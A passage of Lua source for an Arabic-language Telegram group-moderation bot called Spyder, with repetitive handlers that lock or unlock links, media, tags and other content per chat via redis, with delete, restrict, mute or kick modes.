redis:del('Spyder:'..bot_id..'lock:tagservrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","Lock:Inlen","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
redis:del('Spyder:'..bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙تم فتح الكل')  
end,nil)   
end
if text == 'قفل الانلاين' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."Lock:Inlen"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الانلاين بالحذف')  
end,nil)   
elseif text == 'قفل الانلاين بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."Lock:Inlen"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الانلاين بالتقيد')  
end,nil)   
elseif text == 'قفل الانلاين بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."Lock:Inlen"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الانلاين بالكتم')  
end,nil)   
elseif text == 'قفل الانلاين بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."Lock:Inlen"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الانلاين بالطرد')  
end,nil)   
elseif text == 'فتح الانلاين' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."Lock:Inlen"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح الانلاين')  
end,nil)   
end
if text == 'قفل الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Link"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الروابط بالحذف')  
end,nil)   
elseif text == 'قفل الروابط بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Link"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الروابط بالتقيد')  
end,nil)   
elseif text == 'قفل الروابط بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Link"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الروابط بالكتم')  
end,nil)   
elseif text == 'قفل الروابط بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Link"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الروابط بالطرد')  
end,nil)   
elseif text == 'فتح الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Link"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح الروابط')  
end,nil)   
end
if text == 'قفل المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل المعرفات بالحذف')  
end,nil)   
elseif text == 'قفل المعرفات بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل المعرفات بالتقيد')  
end,nil)   
elseif text == 'قفل المعرفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل المعرفات بالكتم')  
end,nil)   
elseif text == 'قفل المعرفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل المعرفات بالطرد')  
end,nil)   
elseif text == 'فتح المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح المعرفات ')  
end,nil)   
end
if text == 'قفل التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل التاك بالحذف')  
end,nil)   
elseif text == 'قفل التاك بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل التاك بالتقيد')  
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل التاك بالكتم')  
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل التاك بالطرد')  
end,nil)   
elseif text == 'فتح التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح التاك')  
end,nil)   
end
if text == 'قفل الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الشارحه بالحذف')  
end,nil)   
elseif text == 'قفل الشارحه بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الشارحه بالتقيد')  
end,nil)   
elseif text == 'قفل الشارحه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الشارحه بالكتم')  
end,nil)   
elseif text == 'قفل الشارحه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الشارحه بالطرد')  
end,nil)   
elseif text == 'فتح الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح الشارحه')  
end,nil)   
end
if text == 'قفل الصور'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الصور بالحذف')  
end,nil)   
elseif text == 'قفل الصور بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الصور بالتقيد')  
end,nil)   
elseif text == 'قفل الصور بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الصور بالكتم')  
end,nil)   
elseif text == 'قفل الصور بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الصور بالطرد')  
end,nil)   
elseif text == 'فتح الصور' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح الصور ')  
end,nil)   
end
if text == 'قفل الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Video"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الفيديو بالحذف')  
end,nil)   
elseif text == 'قفل الفيديو بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Video"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الفيديو بالتقيد')  
end,nil)   
elseif text == 'قفل الفيديو بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Video"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الفيديو بالكتم')  
end,nil)   
elseif text == 'قفل الفيديو بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Video"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الفيديو بالطرد')  
end,nil)   
elseif text == 'فتح الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Video"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح الفيديو')  
end,nil)   
end
if text == 'قفل المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل المتحركه بالحذف')  
end,nil)   
elseif text == 'قفل المتحركه بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل المتحركه بالتقيد')  
end,nil)   
elseif text == 'قفل المتحركه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل المتحركه بالكتم')  
end,nil)   
elseif text == 'قفل المتحركه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل المتحركه بالطرد')  
end,nil)   
elseif text == 'فتح المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح المتحركه')  
end,nil)   
end
if text == 'قفل الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:geam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الالعاب بالحذف')  
end,nil)   
elseif text == 'قفل الالعاب بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:geam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الالعاب بالتقيد')  
end,nil)   
elseif text == 'قفل الالعاب بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:geam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الالعاب بالكتم')  
end,nil)   
elseif text == 'قفل الالعاب بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:geam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الالعاب بالطرد')  
end,nil)   
elseif text == 'فتح الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:geam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح الالعاب')  
end,nil)   
end
if text == 'قفل الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Audio"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الاغاني بالحذف')  
end,nil)   
elseif text == 'قفل الاغاني بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Audio"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الاغاني بالتقيد')  
end,nil)   
elseif text == 'قفل الاغاني بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Audio"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الاغاني بالكتم')  
end,nil)   
elseif text == 'قفل الاغاني بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Audio"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الاغاني بالطرد')  
end,nil)   
elseif text == 'فتح الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:Audio"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح الاغاني')  
end,nil)   
end
if text == 'قفل الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:vico"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الصوت بالحذف')  
end,nil)   
elseif text == 'قفل الصوت بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:vico"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الصوت بالتقيد')  
end,nil)   
elseif text == 'قفل الصوت بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:vico"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الصوت بالكتم')  
end,nil)   
elseif text == 'قفل الصوت بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:vico"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الصوت بالطرد')  
end,nil)   
elseif text == 'فتح الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:del('Spyder:'..bot_id.."lock:vico"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فتح الصوت')  
end,nil)   
end
if text == 'قفل الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الكيبورد بالحذف')  
end,nil)   
elseif text == 'قفل الكيبورد بالتقيد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الكيبورد بالتقيد')  
end,nil)   
elseif text == 'قفل الكيبورد بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
redis:set('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل الكيبورد بالكتم')  
end,nil)   
